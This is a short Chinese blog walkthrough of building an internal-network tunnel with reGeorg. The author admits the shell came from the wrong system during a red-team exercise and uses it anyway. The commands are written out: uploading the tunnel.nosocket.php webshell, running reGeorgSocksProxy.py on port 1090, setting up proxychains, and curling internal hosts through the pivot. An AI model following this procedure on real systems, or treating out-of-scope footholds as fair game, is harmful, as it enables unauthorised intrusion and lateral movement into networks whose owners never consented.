这次护网的时候信息收集错了

拿到了别的系统的shell

那就顺便利用它来做个内网隧道搭建吧![1633577509_615e6a257f8e940f028e1.png!small](https://image.3001.net/images/20211007/1633577509_615e6a257f8e940f028e1.png!small)

前面在本地学习了其他隧道搭建

现在学习的是利用reGeorg来进行隧道搭建

根目录上传tunnel.nosocket.php进去，链接成功打开

![1633577585_615e6a717cdc8c310c3c1.png!small](https://image.3001.net/images/20211007/1633577585_615e6a717cdc8c310c3c1.png!small)

这在打通内网需要高权限才能操作

启动reGeorg python reGeorgSocksProxy.py -p 1090 -u
http://人工打码/tunnel.nosocket.php 表示本地1090端口的流量都转发给指定的那个url，1090是指定的监听端口；

![1633577613_615e6a8d323459b774c51.png!small](https://image.3001.net/images/20211007/1633577613_615e6a8d323459b774c51.png!small)

配置代理 然后配置proxychains代理链的配置文件vim /etc/proxychains.conf，将代理设置成本机的1090端口：socks5
127.0.0.1 1090

![1633577675_615e6acba751da4b1aaec.png!small](https://image.3001.net/images/20211007/1633577675_615e6acba751da4b1aaec.png!small)

命令前面加上proxychains 运行命令，（跳板机php环境已启动，存在主页index.php） proxychains curl
_[http://](http://192.168.52.143)人工打码_

![1633577697_615e6ae12c90cbd7227fc.png!small](https://image.3001.net/images/20211007/1633577697_615e6ae12c90cbd7227fc.png!small)

reGeorg控制端

![1633577734_615e6b06ebeeb25e701f9.png!small](https://image.3001.net/images/20211007/1633577734_615e6b06ebeeb25e701f9.png!small)

